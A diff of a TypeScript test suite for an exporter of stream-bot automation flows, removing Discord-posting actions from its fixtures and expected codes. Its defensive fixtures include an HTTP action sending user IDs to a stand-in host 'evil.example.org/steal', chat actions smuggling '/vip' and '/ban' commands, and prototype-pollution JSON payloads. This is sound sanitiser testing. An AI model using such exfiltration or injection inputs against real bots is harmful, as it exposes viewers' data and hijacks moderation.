@@ -56,7 +56,6 @@ const SHOWCASE: FlowExportRow[] = [
       conditions: [{ type: 'users', params: { allow: ['realviewer'], deny: ['realtroll'] } }],
       actions: [
         chat('{user} redeemed, deaths at {counter:deaths}, {urlfetch:weather}'),
-        { type: 'discord_post', params: { guild_id: '123456789012345678', channel_id: '223456789012345678', text: 'hype' } },
         { type: 'http_post', params: { url: 'https://hooks.example.org/secret-token', body: 'key=hunter2' } },
         {
           type: 'lights',
@@ -161,7 +160,7 @@ describe('exportFlows', () => {
 
   test('reports what the exporter should know about', () => {
     expect(report[0]!.setup.map((n) => n.code)).toEqual(
-      expect.arrayContaining(['reward_trigger', 'users_list', 'discord_target', 'http_target', 'lights_target', 'run_removed', 'counter', 'fetch'])
+      expect.arrayContaining(['reward_trigger', 'users_list', 'http_target', 'lights_target', 'run_removed', 'counter', 'fetch'])
     );
     expect(report.every((r) => r.issues.length === 0)).toBe(true);
   });
@@ -257,7 +256,7 @@ describe('per-recipe refusals', () => {
     const payloads = [
       '{"version":1,"trigger":{"type":"manual","__proto__":{"x":1}}}',
       '{"version":1,"trigger":{"type":"manual"},"constructor":1}',
-      '{"version":1,"trigger":{"type":"manual"},"actions":[{"type":"discord_post","params":{"GUILD_ID":"123456789012345678","channel_id":"223456789012345678","text":"x"}}]}',
+      '{"version":1,"trigger":{"type":"manual"},"actions":[{"type":"http_post","params":{"URL":"https://example.org/x","body":"x"}}]}',
       '{"VERSION":1,"trigger":{"type":"manual"}}',
       '{"version":1,"trigger":{"type":"manual"},"actions":[{"Type":"chat","params":{"text":"x"}}]}'
     ];
@@ -305,7 +304,6 @@ describe('references in a hostile file', () => {
       actions: [
         { type: 'ban', params: { login: 'attacker' } },
         { type: 'http_post', params: { url: 'https://evil.example.org/steal', body: '{user.id}' } },
-        { type: 'discord_post', params: { guild_id: '123456789012345678', channel_id: '223456789012345678', text: 'hi' } },
         chat('/vip attacker'),
         chat('{choice:hello,/ban victim}'),
         run('00000000-1111-4222-8333-444444444444')
@@ -315,14 +313,14 @@ describe('references in a hostile file', () => {
     for (const leak of ['someone-elses-reward', 'attacker"', 'evil.example.org', '123456789012345678', '00000000-1111']) expect(written).not.toContain(leak);
     expect(written).not.toContain('attacker');
     expect(written).not.toContain('victim');
-    expect(hostile.setup).toContainEqual({ code: 'slash_command', path: 'actions[3].params.text', detail: '/vip' });
+    expect(hostile.setup).toContainEqual({ code: 'slash_command', path: 'actions[2].params.text', detail: '/vip' });
     expect(hostile.status).toBe('ready');
     expect(hostile.definition!.trigger.params).toEqual({ reward_id: SETUP_REWARD_ID });
     expect(hostile.definition!.conditions![0]!.params).toEqual({ allow: [SETUP_LOGIN] });
     expect(hostile.definition!.actions!.every((a) => a.enabled === false)).toBe(true);
     expect(hostile.definition!.actions!.some((a) => a.type === 'run')).toBe(false);
     expect(noteCodes(hostile)).toEqual(
-      expect.arrayContaining(['reward_trigger', 'users_list', 'login_target', 'privileged_action', 'http_target', 'discord_target', 'slash_command', 'run_removed'])
+      expect.arrayContaining(['reward_trigger', 'users_list', 'login_target', 'privileged_action', 'http_target', 'slash_command', 'run_removed'])
     );
   });
 
